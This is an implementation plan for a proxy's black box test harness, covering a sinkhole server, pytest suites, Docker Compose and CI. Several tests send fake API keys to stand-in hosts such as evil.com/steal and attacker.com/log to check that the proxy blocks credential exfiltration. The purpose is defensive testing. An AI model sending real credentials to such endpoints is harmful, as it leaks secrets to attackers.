# Black Box Test Harness Implementation Plan

**Branch:** `feature/blackbox-test-harness`
**Created:** 2026-01-07
**Status:** Implementation Ready

## Overview

This document provides concrete, actionable implementation steps for the SafeYolo Black Box Test Harness. It transforms the design in `blackbox-test-harness-plan.md` into executable tasks.

## Phase 1: Foundation (Sinkhole Server + Basic Infrastructure)

### 1.1 Create Directory Structure

```bash
mkdir -p tests/blackbox/{sinkhole,runner,config}
```

Final structure:
```
tests/blackbox/
├── docker-compose.yml          # Test orchestration
├── config/
│   └── test-baseline.yaml      # Test-specific policy
├── sinkhole/
│   ├── Dockerfile
│   ├── server.py               # Multi-host HTTP server
│   ├── handlers.py             # Per-host response handlers
│   ├── models.py               # CapturedRequest dataclass
│   └── requirements.txt
├── runner/
│   ├── Dockerfile
│   ├── conftest.py             # Pytest fixtures
│   ├── sinkhole_client.py      # Client for sinkhole control API
│   ├── test_credential_guard.py
│   ├── test_network_guard.py
│   ├── test_circuit_breaker.py
│   └── requirements.txt
└── run_tests.sh                # Convenience script
```

### 1.2 Implement Sinkhole Server

**File:** `tests/blackbox/sinkhole/models.py`

```python
from dataclasses import dataclass, field
from datetime import datetime

@dataclass
class CapturedRequest:
    """A captured HTTP request for later inspection."""
    timestamp: float
    host: str                       # From Host header / SNI
    method: str
    path: str
    headers: dict[str, str]
    body: bytes
    client_ip: str
    query_params: dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "host": self.host,
            "method": self.method,
            "path": self.path,
            "headers": self.headers,
            "body": self.body.decode("utf-8", errors="replace"),
            "client_ip": self.client_ip,
            "query_params": self.query_params,
        }
```

**File:** `tests/blackbox/sinkhole/handlers.py`

```python
"""Response handlers for different simulated hosts."""

from dataclasses import dataclass
import json


@dataclass
class Response:
    status: int = 200
    body: bytes = b""
    headers: dict[str, str] = None

    def __post_init__(self):
        if self.headers is None:
            self.headers = {"Content-Type": "application/json"}

    @classmethod
    def json(cls, data: dict, status: int = 200):
        return cls(
            status=status,
            body=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"}
        )


class OpenAIHandler:
    """Simulates OpenAI API responses."""

    def handle(self, request) -> Response:
        if request.path == "/v1/chat/completions":
            return Response.json({
                "id": "chatcmpl-test123",
                "object": "chat.completion",
                "created": 1700000000,
                "model": "gpt-4",
                "choices": [{
                    "index": 0,
                    "message": {"role": "assistant", "content": "Hello from sinkhole!"},
                    "finish_reason": "stop"
                }],
                "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15}
            })
        elif request.path == "/v1/models":
            return Response.json({"data": [{"id": "gpt-4", "object": "model"}]})
        return Response.json({"error": "not found"}, 404)


class AnthropicHandler:
    """Simulates Anthropic API responses."""

    def handle(self, request) -> Response:
        if request.path == "/v1/messages":
            return Response.json({
                "id": "msg-test123",
                "type": "message",
                "role": "assistant",
                "content": [{"type": "text", "text": "Hello from sinkhole!"}],
                "model": "claude-3-opus-20240229",
                "stop_reason": "end_turn",
                "usage": {"input_tokens": 10, "output_tokens": 5}
            })
        return Response.json({"error": "not found"}, 404)


class GenericHandler:
    """Returns 200 OK with request echo for any request."""

    def handle(self, request) -> Response:
        return Response.json({
            "received": True,
            "host": request.host,
            "method": request.method,
            "path": request.path,
            "has_auth": "Authorization" in request.headers or "x-api-key" in request.headers
        })


class FailingHandler:
    """Returns 500 errors to trigger circuit breaker."""

    def __init__(self, fail_count: int = 999):
        self.fail_count = fail_count
        self.request_count = 0

    def handle(self, request) -> Response:
        self.request_count += 1
        if self.request_count <= self.fail_count:
            return Response.json({"error": "Internal Server Error"}, 500)
        return Response.json({"status": "recovered"}, 200)


# Handler registry - maps hostnames to handlers
HANDLERS = {
    "api.openai.com": OpenAIHandler(),
    "api.anthropic.com": AnthropicHandler(),
    "evil.com": GenericHandler(),
    "attacker.com": GenericHandler(),
    "httpbin.org": GenericHandler(),
    "failing.test": FailingHandler(),
}

DEFAULT_HANDLER = GenericHandler()
```

**File:** `tests/blackbox/sinkhole/server.py`

```python
"""
Multi-host HTTP server that acts as a sinkhole for all test traffic.

Routes requests based on Host header to appropriate handlers.
Records all requests for later inspection via control API.
"""

import json
import logging
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Optional

from models import CapturedRequest
from handlers import HANDLERS, DEFAULT_HANDLER, Response

log = logging.getLogger("sinkhole")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(name)s %(message)s")

# Thread-safe request storage
_lock = threading.Lock()
_captured_requests: list[CapturedRequest] = []


def capture_request(req: CapturedRequest):
    """Store a captured request."""
    with _lock:
        _captured_requests.append(req)


def get_requests(
    host: Optional[str] = None,
    since: Optional[float] = None,
    method: Optional[str] = None,
) -> list[CapturedRequest]:
    """Query captured requests with optional filters."""
    with _lock:
        results = list(_captured_requests)

    if host:
        results = [r for r in results if r.host == host]
    if since:
        results = [r for r in results if r.timestamp >= since]
    if method:
        results = [r for r in results if r.method == method]

    return results


def clear_requests():
    """Clear all captured requests."""
    with _lock:
        _captured_requests.clear()


class SinkholeHandler(BaseHTTPRequestHandler):
    """HTTP handler that routes to per-host handlers and captures requests."""

    def log_message(self, format, *args):
        log.debug(f"{self.client_address[0]} - {format % args}")

    def _get_host(self) -> str:
        """Extract host from Host header."""
        host = self.headers.get("Host", "unknown")
        # Strip port if present
        if ":" in host:
            host = host.split(":")[0]
        return host

    def _read_body(self) -> bytes:
        """Read request body."""
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length:
            return self.rfile.read(content_length)
        return b""

    def _capture_and_route(self, method: str):
        """Capture request and route to handler."""
        host = self._get_host()
        body = self._read_body()
        parsed = urlparse(self.path)

        # Capture the request
        captured = CapturedRequest(
            timestamp=time.time(),
            host=host,
            method=method,
            path=parsed.path,
            headers=dict(self.headers),
            body=body,
            client_ip=self.client_address[0],
            query_params=parse_qs(parsed.query),
        )
        capture_request(captured)
        log.info(f"Captured: {method} {host}{self.path}")

        # Route to handler
        handler = HANDLERS.get(host, DEFAULT_HANDLER)
        response = handler.handle(captured)

        # Send response
        self.send_response(response.status)
        for name, value in response.headers.items():
            self.send_header(name, value)
        self.send_header("Content-Length", str(len(response.body)))
        self.end_headers()
        self.wfile.write(response.body)

    def do_GET(self):
        self._capture_and_route("GET")

    def do_POST(self):
        self._capture_and_route("POST")

    def do_PUT(self):
        self._capture_and_route("PUT")

    def do_DELETE(self):
        self._capture_and_route("DELETE")

    def do_PATCH(self):
        self._capture_and_route("PATCH")


class ControlAPIHandler(BaseHTTPRequestHandler):
    """Control API for test assertions."""

    def log_message(self, format, *args):
        log.debug(f"Control API: {format % args}")

    def _send_json(self, data: dict, status: int = 200):
        body = json.dumps(data, indent=2).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)

        if parsed.path == "/health":
            self._send_json({"status": "ok"})
        elif parsed.path == "/requests":
            host = query.get("host", [None])[0]
            since = query.get("since", [None])[0]
            since_float = float(since) if since else None

            requests = get_requests(host=host, since=since_float)
            self._send_json({
                "count": len(requests),
                "requests": [r.to_dict() for r in requests]
            })
        else:
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        if self.path == "/requests/clear":
            clear_requests()
            self._send_json({"status": "cleared"})
        else:
            self._send_json({"error": "not found"}, 404)


def run_servers(sinkhole_port: int = 8080, control_port: int = 9999):
    """Run both sinkhole and control API servers."""
    sinkhole = HTTPServer(("0.0.0.0", sinkhole_port), SinkholeHandler)
    control = HTTPServer(("0.0.0.0", control_port), ControlAPIHandler)

    log.info(f"Sinkhole server on port {sinkhole_port}")
    log.info(f"Control API on port {control_port}")

    # Run control API in background thread
    control_thread = threading.Thread(target=control.serve_forever, daemon=True)
    control_thread.start()

    # Run sinkhole in main thread
    try:
        sinkhole.serve_forever()
    except KeyboardInterrupt:
        log.info("Shutting down...")
        sinkhole.shutdown()
        control.shutdown()


if __name__ == "__main__":
    run_servers()
```

**File:** `tests/blackbox/sinkhole/requirements.txt`

```
# Sinkhole server - minimal dependencies
# Uses stdlib only for core functionality
```

**File:** `tests/blackbox/sinkhole/Dockerfile`

```dockerfile
FROM python:3.12-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt || true

COPY *.py .

EXPOSE 8080 9999

CMD ["python", "server.py"]
```

### 1.3 Implement Test Runner

**File:** `tests/blackbox/runner/sinkhole_client.py`

```python
"""Client for sinkhole control API."""

import httpx
from dataclasses import dataclass
from typing import Optional


@dataclass
class CapturedRequest:
    """Mirrored from sinkhole for type safety."""
    timestamp: float
    host: str
    method: str
    path: str
    headers: dict[str, str]
    body: str
    client_ip: str
    query_params: dict[str, list[str]]


class SinkholeClient:
    """Client for querying and controlling the sinkhole server."""

    def __init__(self, base_url: str = "http://sinkhole:9999"):
        self.base_url = base_url.rstrip("/")
        self._client = httpx.Client(timeout=10.0)

    def health(self) -> bool:
        """Check if sinkhole is healthy."""
        try:
            resp = self._client.get(f"{self.base_url}/health")
            return resp.status_code == 200
        except httpx.RequestError:
            return False

    def clear_requests(self):
        """Clear all captured requests."""
        resp = self._client.post(f"{self.base_url}/requests/clear")
        resp.raise_for_status()

    def get_requests(
        self,
        host: Optional[str] = None,
        since: Optional[float] = None,
    ) -> list[CapturedRequest]:
        """Get captured requests with optional filtering."""
        params = {}
        if host:
            params["host"] = host
        if since:
            params["since"] = str(since)

        resp = self._client.get(f"{self.base_url}/requests", params=params)
        resp.raise_for_status()

        data = resp.json()
        return [
            CapturedRequest(
                timestamp=r["timestamp"],
                host=r["host"],
                method=r["method"],
                path=r["path"],
                headers=r["headers"],
                body=r["body"],
                client_ip=r["client_ip"],
                query_params=r.get("query_params", {}),
            )
            for r in data["requests"]
        ]

    def get_request_count(self, host: Optional[str] = None) -> int:
        """Get count of captured requests."""
        return len(self.get_requests(host=host))

    def wait_for_ready(self, timeout: float = 30.0):
        """Wait for sinkhole to be ready."""
        import time
        start = time.time()
        while time.time() - start < timeout:
            if self.health():
                return
            time.sleep(0.5)
        raise TimeoutError("Sinkhole not ready")
```

**File:** `tests/blackbox/runner/conftest.py`

```python
"""Pytest fixtures for black box tests."""

import os
import time
import pytest
import httpx

from sinkhole_client import SinkholeClient


# Environment configuration
PROXY_URL = os.environ.get("PROXY_URL", "http://safeyolo:8080")
ADMIN_URL = os.environ.get("ADMIN_URL", "http://safeyolo:9090")
ADMIN_TOKEN = os.environ.get("ADMIN_API_TOKEN", "")
SINKHOLE_API = os.environ.get("SINKHOLE_API", "http://sinkhole:9999")


@pytest.fixture(scope="session")
def sinkhole():
    """Sinkhole client for request inspection."""
    client = SinkholeClient(SINKHOLE_API)
    client.wait_for_ready(timeout=60)
    return client


@pytest.fixture(scope="session")
def admin_headers():
    """Headers for admin API authentication."""
    return {"Authorization": f"Bearer {ADMIN_TOKEN}"}


@pytest.fixture(scope="session")
def admin_client(admin_headers):
    """HTTP client for admin API."""
    return httpx.Client(
        base_url=ADMIN_URL,
        headers=admin_headers,
        timeout=10.0,
    )


@pytest.fixture(scope="session")
def proxy_client():
    """HTTP client that routes through SafeYolo proxy."""
    # IMPORTANT: Don't verify SSL since we're using mitmproxy CA
    return httpx.Client(
        proxy=PROXY_URL,
        verify=False,  # Trust mitmproxy CA
        timeout=30.0,
    )


@pytest.fixture(autouse=True)
def clear_sinkhole(sinkhole):
    """Clear sinkhole before each test."""
    sinkhole.clear_requests()
    yield


@pytest.fixture(scope="session")
def wait_for_services(sinkhole, admin_client):
    """Ensure all services are ready before tests run."""
    # Sinkhole ready (handled by sinkhole fixture)

    # SafeYolo ready
    for attempt in range(60):
        try:
            resp = admin_client.get("/health")
            if resp.status_code == 200:
                break
        except httpx.RequestError:
            pass
        time.sleep(1)
    else:
        pytest.fail("SafeYolo admin API not ready after 60 seconds")

    yield
```

**File:** `tests/blackbox/runner/test_credential_guard.py`

```python
"""
Black box tests for credential guard.

These tests verify that:
1. API keys are only sent to their authorized destinations
2. Blocked requests do NOT leak credentials to the sinkhole
3. Legitimate requests pass through with credentials intact
"""

import pytest


class TestCredentialRouting:
    """Test that credentials only reach their authorized hosts."""

    def test_openai_key_to_openai_allowed(self, proxy_client, sinkhole, wait_for_services):
        """OpenAI API key to api.openai.com should be forwarded."""
        response = proxy_client.post(
            "https://api.openai.com/v1/chat/completions",
            headers={"Authorization": "Bearer sk-proj-test123456789"},
            json={"model": "gpt-4", "messages": []},
        )

        # Request should succeed (sinkhole returns 200)
        assert response.status_code == 200

        # Verify sinkhole received the request WITH credentials
        requests = sinkhole.get_requests(host="api.openai.com")
        assert len(requests) == 1
        assert "Authorization" in requests[0].headers
        assert requests[0].headers["Authorization"].startswith("Bearer sk-")

    def test_openai_key_to_evil_blocked(self, proxy_client, sinkhole, wait_for_services):
        """OpenAI API key to evil.com should be BLOCKED."""
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": "Bearer sk-proj-test123456789"},
            json={"data": "secret"},
        )

        # Request should be blocked (428 requires approval)
        assert response.status_code == 428

        # CRITICAL: Sinkhole should NOT receive ANY request
        requests = sinkhole.get_requests(host="evil.com")
        assert len(requests) == 0, "Credential should not leak to evil.com"

    def test_anthropic_key_to_anthropic_allowed(self, proxy_client, sinkhole, wait_for_services):
        """Anthropic API key to api.anthropic.com should be forwarded."""
        response = proxy_client.post(
            "https://api.anthropic.com/v1/messages",
            headers={
                "x-api-key": "sk-ant-test123456789",
                "anthropic-version": "2023-06-01",
            },
            json={"model": "claude-3-opus-20240229", "messages": [], "max_tokens": 100},
        )

        assert response.status_code == 200

        requests = sinkhole.get_requests(host="api.anthropic.com")
        assert len(requests) == 1
        assert "x-api-key" in requests[0].headers

    def test_anthropic_key_to_attacker_blocked(self, proxy_client, sinkhole, wait_for_services):
        """Anthropic API key to attacker.com should be BLOCKED."""
        response = proxy_client.post(
            "https://attacker.com/log",
            headers={"x-api-key": "sk-ant-test123456789"},
            json={"stolen": True},
        )

        assert response.status_code == 428

        # Verify no leak
        requests = sinkhole.get_requests(host="attacker.com")
        assert len(requests) == 0, "Credential should not leak to attacker.com"

    def test_no_credentials_passes_through(self, proxy_client, sinkhole, wait_for_services):
        """Request without credentials should pass through normally."""
        response = proxy_client.get("https://httpbin.org/get")

        assert response.status_code == 200

        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1


class TestCredentialInBody:
    """Test that credentials in request bodies are also detected."""

    def test_key_in_json_body_blocked(self, proxy_client, sinkhole, wait_for_services):
        """API key embedded in JSON body should be blocked."""
        response = proxy_client.post(
            "https://evil.com/webhook",
            json={
                "config": {
                    "api_key": "sk-proj-test123456789",
                    "endpoint": "https://api.openai.com"
                }
            },
        )

        # Should be blocked
        assert response.status_code in (403, 428)

        # Verify no leak
        requests = sinkhole.get_requests(host="evil.com")
        assert len(requests) == 0


class TestBlockResponseContent:
    """Test the content of block responses."""

    def test_block_response_includes_event_id(self, proxy_client, wait_for_services):
        """Blocked requests should include event_id for audit trail."""
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": "Bearer sk-proj-test123456789"},
        )

        assert response.status_code == 428

        # Response should include event_id for correlation
        data = response.json()
        assert "event_id" in data or "request_id" in data

    def test_block_response_indicates_approval_required(self, proxy_client, wait_for_services):
        """Block response should indicate approval is required."""
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": "Bearer sk-proj-test123456789"},
        )

        assert response.status_code == 428
        data = response.json()
        # Should indicate this needs approval
        assert "approval" in str(data).lower() or "prompt" in str(data).lower()
```

**File:** `tests/blackbox/runner/test_network_guard.py`

```python
"""
Black box tests for network guard (access control + rate limiting).
"""

import pytest
import time


class TestAccessControl:
    """Test domain-based access control."""

    def test_allowed_domain_passes(self, proxy_client, sinkhole, wait_for_services):
        """Request to allowed domain should pass through."""
        response = proxy_client.get("https://httpbin.org/get")

        assert response.status_code == 200

        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1


class TestRateLimiting:
    """Test rate limiting (budget) enforcement."""

    def test_budget_enforced(self, proxy_client, sinkhole, admin_client, wait_for_services):
        """Requests over budget should be rate limited."""
        # First, reset budgets to ensure clean state
        admin_client.post("/admin/budgets/reset")

        # The baseline.yaml has default budget of 600 req/min (10 rps)
        # Send requests rapidly to exhaust budget
        # Note: This test assumes a test-specific low budget configuration

        # For this test to work reliably, we need a test-specific budget
        # configured in test-baseline.yaml with a very low limit

        # Send many requests quickly
        responses = []
        for i in range(20):
            resp = proxy_client.get("https://httpbin.org/get")
            responses.append(resp.status_code)

        # At least some should succeed, and eventually we should hit limits
        assert 200 in responses, "Some requests should succeed"
        # Note: May or may not hit 429 depending on configured budget
```

**File:** `tests/blackbox/runner/test_circuit_breaker.py`

```python
"""
Black box tests for circuit breaker.
"""

import pytest


class TestCircuitBreaker:
    """Test circuit breaker behavior."""

    def test_healthy_upstream_passes(self, proxy_client, sinkhole, wait_for_services):
        """Requests to healthy upstream should pass."""
        response = proxy_client.get("https://httpbin.org/get")

        assert response.status_code == 200

        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1

    # Note: Testing circuit breaker opening requires the sinkhole to return
    # failures, which needs the failing.test handler to be accessible.
    # This is more complex and may need additional setup.
```

**File:** `tests/blackbox/runner/requirements.txt`

```
httpx>=0.27.0
pytest>=8.0.0
pytest-timeout>=2.3.0
```

**File:** `tests/blackbox/runner/Dockerfile`

```dockerfile
FROM python:3.12-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY *.py .

# Default: run all tests
CMD ["pytest", "-v", "--tb=short"]
```

### 1.4 Create Docker Compose

**File:** `tests/blackbox/docker-compose.yml`

```yaml
# SafeYolo Black Box Test Harness
#
# Usage:
#   docker compose up --build --abort-on-container-exit
#   docker compose run test-runner pytest test_credential_guard.py -v
#   docker compose run test-runner bash  # Interactive debugging
#
# Architecture:
#   - safeyolo: The proxy under test (built from project root)
#   - sinkhole: Multi-host HTTP server capturing all traffic
#   - test-runner: Pytest-based test suite
#
# All hostnames (api.openai.com, evil.com, etc.) resolve to sinkhole
# within the test network via Docker network aliases.

services:
  # SafeYolo proxy (the system under test)
  safeyolo:
    build:
      context: ../..
      target: dev
    container_name: safeyolo-test
    networks:
      testnet:
        aliases:
          - safeyolo
    ports:
      - "18080:8080"   # Proxy (for debugging)
      - "19090:9090"   # Admin API (for debugging)
    volumes:
      - ./config:/app/config:ro
      - safeyolo-test-certs:/certs-private
      - safeyolo-test-ca:/certs-public
      - safeyolo-test-logs:/app/logs
      - safeyolo-test-data:/app/data
    environment:
      - PROXY_PORT=8080
      - ADMIN_PORT=9090
      - SAFEYOLO_BLOCK=true
      # Test token for deterministic auth
      - ADMIN_API_TOKEN=test-token-for-blackbox-tests
    command: ["/app/scripts/start-safeyolo.sh"]
    healthcheck:
      test: ["CMD", "python3", "-c", "import httpx; httpx.get('http://localhost:9090/health', timeout=2)"]
      interval: 5s
      timeout: 10s
      retries: 12
      start_period: 30s

  # Sinkhole: captures all traffic for inspection
  sinkhole:
    build: ./sinkhole
    container_name: sinkhole
    networks:
      testnet:
        aliases:
          # All test hostnames resolve to sinkhole
          - api.openai.com
          - api.anthropic.com
          - api.github.com
          - evil.com
          - attacker.com
          - httpbin.org
          - failing.test
          - legitimate-api.com
    ports:
      - "19999:9999"   # Control API (for debugging)
    healthcheck:
      test: ["CMD", "python3", "-c", "import httpx; httpx.get('http://localhost:9999/health', timeout=2)"]
      interval: 2s
      timeout: 5s
      retries: 10

  # Test runner
  test-runner:
    build: ./runner
    container_name: test-runner
    networks:
      - testnet
    depends_on:
      safeyolo:
        condition: service_healthy
      sinkhole:
        condition: service_healthy
    environment:
      - PROXY_URL=http://safeyolo:8080
      - ADMIN_URL=http://safeyolo:9090
      - ADMIN_API_TOKEN=test-token-for-blackbox-tests
      - SINKHOLE_API=http://sinkhole:9999
      # Disable SSL verification for mitmproxy CA
      - SSL_CERT_FILE=/dev/null
      - REQUESTS_CA_BUNDLE=/dev/null
    volumes:
      # Mount test files for development
      - ./runner:/app:ro

networks:
  testnet:
    driver: bridge

volumes:
  safeyolo-test-certs:
  safeyolo-test-ca:
  safeyolo-test-logs:
  safeyolo-test-data:
```

### 1.5 Create Test Configuration

**File:** `tests/blackbox/config/baseline.yaml`

```yaml
# Test-specific baseline policy
# Mirrors production baseline but with test-friendly budgets

metadata:
  version: "1.0"
  description: "Black box test baseline"

permissions:
  # Credential permissions (same as production)
  - action: credential:use
    resource: "api.openai.com/*"
    effect: allow
    tier: explicit
    condition:
      credential: ["openai:*"]

  - action: credential:use
    resource: "api.anthropic.com/*"
    effect: allow
    tier: explicit
    condition:
      credential: ["anthropic:*"]

  - action: credential:use
    resource: "api.github.com/*"
    effect: allow
    tier: explicit
    condition:
      credential: ["github:*"]

  # Unknown destinations require approval (this is what we're testing!)
  - action: credential:use
    resource: "*"
    effect: prompt
    tier: explicit

  # Network budgets (low for testing)
  - action: network:request
    resource: "api.openai.com/*"
    effect: budget
    budget: 100
    tier: explicit

  - action: network:request
    resource: "api.anthropic.com/*"
    effect: budget
    budget: 100
    tier: explicit

  # Default budget (very low for testing rate limiting)
  - action: network:request
    resource: "*"
    effect: budget
    budget: 60
    tier: explicit

budgets:
  network:request: 1000

required:
  - credential_guard
  - network_guard
  - circuit_breaker

addons:
  network_guard:
    enabled: true
  credential_guard:
    enabled: true
  circuit_breaker:
    enabled: true
  pattern_scanner:
    enabled: true
```

### 1.6 Create Convenience Script

**File:** `tests/blackbox/run_tests.sh`

```bash
#!/bin/bash
#
# Run SafeYolo black box tests
#
# Usage:
#   ./run_tests.sh                    # Run all tests
#   ./run_tests.sh -k credential      # Run credential tests only
#   ./run_tests.sh --debug            # Start services, drop to bash
#

set -e

cd "$(dirname "$0")"

# Parse args
DEBUG=false
PYTEST_ARGS=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --debug)
            DEBUG=true
            shift
            ;;
        *)
            PYTEST_ARGS="$PYTEST_ARGS $1"
            shift
            ;;
    esac
done

# Build images
echo "Building test images..."
docker compose build

if [ "$DEBUG" = true ]; then
    echo "Starting services in debug mode..."
    docker compose up -d safeyolo sinkhole
    echo ""
    echo "Services started. Entering test-runner shell..."
    echo "Run: pytest -v to execute tests"
    echo ""
    docker compose run --rm test-runner bash
    docker compose down -v
else
    echo "Running tests..."
    docker compose up --abort-on-container-exit --exit-code-from test-runner $PYTEST_ARGS
    EXIT_CODE=$?

    echo ""
    echo "Cleaning up..."
    docker compose down -v

    exit $EXIT_CODE
fi
```

Make it executable:
```bash
chmod +x tests/blackbox/run_tests.sh
```

---

## Phase 2: TLS Support

### 2.1 Generate Test Certificates

The sinkhole needs TLS certificates that clients will trust through SafeYolo's MITM CA.

**Option A: Use mitmproxy's upstream certificate generation**
- SafeYolo already handles TLS termination
- Sinkhole can remain HTTP-only
- SafeYolo intercepts HTTPS, re-encrypts to sinkhole

This is the simplest approach and is already supported by the Phase 1 architecture.

**Option B: Sinkhole with its own TLS (more complex)**
- Would require wildcard cert generation
- Clients would need to trust both CAs
- Not necessary for testing SafeYolo's behavior

**Recommendation:** Use Option A. The current architecture already supports HTTPS testing because:
1. Test runner requests `https://api.openai.com/...` through SafeYolo proxy
2. SafeYolo terminates TLS with its CA
3. SafeYolo connects to upstream (sinkhole at `api.openai.com`) via HTTP
4. Docker network aliases make `api.openai.com` resolve to sinkhole

For this to work, SafeYolo must connect to upstreams without HTTPS verification OR the sinkhole must support HTTPS. The simpler approach is to configure SafeYolo to allow HTTP upstreams in test mode.

### 2.2 Update Sinkhole for HTTPS (Optional Enhancement)

If explicit HTTPS on sinkhole is needed:

```python
# In server.py, add HTTPS support
import ssl

def run_servers(sinkhole_port: int = 8080, control_port: int = 9999, tls_cert: str = None):
    sinkhole = HTTPServer(("0.0.0.0", sinkhole_port), SinkholeHandler)

    if tls_cert:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(tls_cert, tls_key)
        sinkhole.socket = context.wrap_socket(sinkhole.socket, server_side=True)

    # ... rest of server setup
```

---

## Phase 3: Advanced Test Scenarios

### 3.1 Circuit Breaker Tests

Add to `test_circuit_breaker.py`:

```python
class TestCircuitBreakerTripping:
    """Test that circuit breaker opens after failures."""

    def test_circuit_opens_after_failures(self, proxy_client, sinkhole, wait_for_services):
        """Circuit should open after consecutive failures."""
        # This requires sinkhole's failing.test handler
        # which returns 500s until reset

        failures = 0
        circuit_open = False

        for i in range(20):
            resp = proxy_client.get("https://failing.test/api")
            if resp.status_code == 503:
                circuit_open = True
                break
            elif resp.status_code == 500:
                failures += 1

        # Circuit should eventually open (503) after enough 500s
        # Depends on circuit breaker configuration
```

### 3.2 Header Modification Tests

**File:** `tests/blackbox/runner/test_headers.py`

```python
"""
Black box tests for header modification.
"""

import pytest


class TestRequestIdInjection:
    """Test that request IDs are added to requests."""

    def test_request_id_added(self, proxy_client, sinkhole, wait_for_services):
        """Proxy should add X-Request-Id header."""
        response = proxy_client.get("https://httpbin.org/get")

        assert response.status_code == 200

        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1

        # SafeYolo should have added request ID
        headers = requests[0].headers
        assert any(h.lower() == "x-request-id" for h in headers), \
            f"X-Request-Id not found in headers: {list(headers.keys())}"


class TestSensitiveHeaderStripping:
    """Test that sensitive headers are handled appropriately."""

    def test_proxy_headers_not_leaked(self, proxy_client, sinkhole, wait_for_services):
        """Proxy-specific headers should not reach upstream."""
        response = proxy_client.get(
            "https://httpbin.org/get",
            headers={"Proxy-Authorization": "Basic secret123"}
        )

        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1

        # Proxy-Authorization should be consumed by proxy, not forwarded
        headers_lower = {k.lower(): v for k, v in requests[0].headers.items()}
        assert "proxy-authorization" not in headers_lower
```

### 3.3 Audit Trail Correlation Tests

**File:** `tests/blackbox/runner/test_audit.py`

```python
"""
Black box tests for audit trail and logging.
"""

import pytest


class TestAuditEventIds:
    """Test that audit events can be correlated."""

    def test_blocked_request_returns_event_id(self, proxy_client, wait_for_services):
        """Blocked requests should return correlatable event IDs."""
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": "Bearer sk-proj-test123456789"},
        )

        assert response.status_code == 428
        data = response.json()

        # Should have either event_id or request_id for audit correlation
        assert "event_id" in data or "request_id" in data, \
            f"No event ID in response: {data}"

    def test_allowed_request_has_request_id(self, proxy_client, sinkhole, wait_for_services):
        """Allowed requests should have request ID in audit."""
        response = proxy_client.get("https://httpbin.org/get")

        assert response.status_code == 200

        # Request should have been tagged with ID
        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1

        headers_lower = {k.lower(): v for k, v in requests[0].headers.items()}
        assert "x-request-id" in headers_lower
```

---

## Phase 4: CI Integration

### 4.1 GitHub Actions Workflow

**File:** `.github/workflows/blackbox-tests.yml`

```yaml
name: Black Box Tests

on:
  push:
    branches: [master, main]
    paths:
      - 'addons/**'
      - 'pdp/**'
      - 'config/**'
      - 'tests/blackbox/**'
      - 'Dockerfile'
  pull_request:
    branches: [master, main]
    paths:
      - 'addons/**'
      - 'pdp/**'
      - 'config/**'
      - 'tests/blackbox/**'
      - 'Dockerfile'

jobs:
  blackbox-tests:
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build and run black box tests
        working-directory: tests/blackbox
        run: |
          docker compose build
          docker compose up --abort-on-container-exit --exit-code-from test-runner

      - name: Upload test logs on failure
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: test-logs
          path: tests/blackbox/logs/

      - name: Cleanup
        if: always()
        working-directory: tests/blackbox
        run: docker compose down -v
```

### 4.2 Makefile Target

Add to project `Makefile`:

```makefile
.PHONY: test-blackbox
test-blackbox:
	cd tests/blackbox && ./run_tests.sh

.PHONY: test-blackbox-debug
test-blackbox-debug:
	cd tests/blackbox && ./run_tests.sh --debug
```

---

## Implementation Checklist

### Phase 1: Foundation
- [ ] Create directory structure
- [ ] Implement sinkhole/models.py
- [ ] Implement sinkhole/handlers.py
- [ ] Implement sinkhole/server.py
- [ ] Create sinkhole/Dockerfile
- [ ] Implement runner/sinkhole_client.py
- [ ] Implement runner/conftest.py
- [ ] Implement runner/test_credential_guard.py
- [ ] Implement runner/test_network_guard.py
- [ ] Create runner/Dockerfile
- [ ] Create docker-compose.yml
- [ ] Create test-baseline.yaml
- [ ] Create run_tests.sh
- [ ] Verify tests pass locally

### Phase 2: TLS Support
- [ ] Verify HTTPS requests work through proxy to HTTP sinkhole
- [ ] (Optional) Add TLS support to sinkhole if needed

### Phase 3: Advanced Tests
- [ ] Add circuit breaker tripping tests
- [ ] Add header modification tests
- [ ] Add audit trail correlation tests
- [ ] Add rate limiting tests with low budget

### Phase 4: CI Integration
- [ ] Create GitHub Actions workflow
- [ ] Add Makefile targets
- [ ] Document in README

---

## Success Criteria

The black box test harness is complete when:

1. **Isolation**: Tests run in isolated Docker network with no external dependencies
2. **Determinism**: All test hostnames resolve to sinkhole, responses are predictable
3. **Observability**: Every request can be inspected at the sinkhole
4. **Coverage**: All security guarantees have corresponding black box tests:
   - Credential routing protection
   - Access control enforcement
   - Rate limiting (budget) enforcement
   - Block responses include audit correlation
5. **CI Ready**: Can run in CI pipeline with single command
6. **Developer Experience**: Easy to run locally, debug failures, add new tests

---

## Notes

### Why Black Box Testing?

Unit tests verify addon logic in isolation. Black box tests verify:
- End-to-end request flow through the full proxy stack
